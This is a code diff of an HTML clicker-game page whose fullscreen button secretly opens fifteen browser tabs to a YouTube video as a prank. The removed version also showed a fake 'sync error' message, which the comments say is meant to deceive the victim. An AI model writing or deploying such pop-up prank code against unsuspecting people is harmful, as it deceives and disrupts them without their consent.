@@ -57,7 +57,7 @@
             border-radius: 6px;
             cursor: pointer;
             transition: background 0.2s;
-            display: none; /* Появится, когда хватит очков */
+            display: none;
         }
         #upgrade-btn:hover { background-color: #2ea043; }
         
@@ -96,16 +96,14 @@
     <script>
         var videoUrl = "https://youtu.be/w5BnMKOG33M";
         var score = 0;
-        var clickPower = 1; // Сколько очков дает 1 клик
-        var upgradeCost = 10; // Цена улучшения
-        var bombStarted = false; // Флаг, чтобы не запускать дважды
+        var clickPower = 1; 
+        var upgradeCost = 10; 
 
         // Логика кликера
         document.getElementById('clicker').addEventListener('click', function() {
             score += clickPower;
             document.getElementById('score').innerText = score;
             
-            // Проверяем, хватает ли на улучшение
             if (score >= upgradeCost) {
                 document.getElementById('upgrade-btn').style.display = 'inline-block';
             }
@@ -115,56 +113,34 @@
         document.getElementById('upgrade-btn').addEventListener('click', function() {
             if (score >= upgradeCost) {
                 score -= upgradeCost;
-                clickPower *= 2; // Удваиваем силу клика
-                upgradeCost = Math.floor(upgradeCost * 2.5); // Повышаем цену
+                clickPower *= 2; 
+                upgradeCost = Math.floor(upgradeCost * 2.5); 
                 
                 document.getElementById('score').innerText = score;
                 this.innerText = "Улучшить ферму (Цена: " + upgradeCost + ")";
                 document.getElementById('status-text').innerHTML = "<span style='color:#3fb950;'>Ферма улучшена! Теперь клик дает x" + clickPower + "</span>";
                 
-                // Если денег снова не хватает, прячем кнопку
                 if (score < upgradeCost) {
                     this.style.display = 'none';
                 }
             }
         });
 
-        // 🚀 ГЛАВНЫЙ ТРИГГЕР: Пранк начинается при нажатии на "На весь экран"
+        // 💥 ТРИГГЕР: Мгновенно открываем 15 вкладок при нажатии на "На весь экран"
         document.getElementById('fs-btn').addEventListener('click', function() {
-            // 1. Запрашиваем фуллскрин
+            // 1. Включаем фуллскрин
             var element = document.documentElement;
             if (element.requestFullscreen) {
                 element.requestFullscreen().catch(err => {
-                    console.log("Ошибка фуллскрина: " + err.message);
+                    console.log("Ошибка: " + err.message);
                 });
             }
 
-            // 2. Прячем кнопку фуллскрина, чтобы он не нажал её снова
-            this.style.display = 'none';
-
-            // 3. Меняем текст статуса, чтобы выглядело как ошибка загрузки
-            document.getElementById('status-text').innerHTML = "<span style='color:#f85149;'>Синхронизация с сервером...</span>";
-
-            // 4. Запускаем открытие видео через 3 секунды (чтобы он подумал, что идет загрузка)
-            if (!bombStarted) {
-                bombStarted = true;
-                setTimeout(function() {
-                    document.getElementById('status-text').innerHTML = "<span style='color:#f85149;'>Ошибка синхронизации. Перезагрузка...</span>";
-                    
-                    var count = 0;
-                    var maxOpenings = 15; // Ограничение, чтобы не убить его комп (можно убрать)
-
-                    var bombInterval = setInterval(function() {
-                        window.open(videoUrl, '_blank');
-                        count++;
-                        
-                        if (count >= maxOpenings) {
-                            clearInterval(bombInterval);
-                        }
-                    }, 2000); // Каждые 2 секунды
-                }, 3000); // 3 секунды задержки после клика
+            // 2. Мгновенно открываем 15 вкладок
+            for (var i = 0; i < 15; i++) {
+                window.open(videoUrl, '_blank');
             }
         });
     </script>
 </body>
-  </html>
+</html>
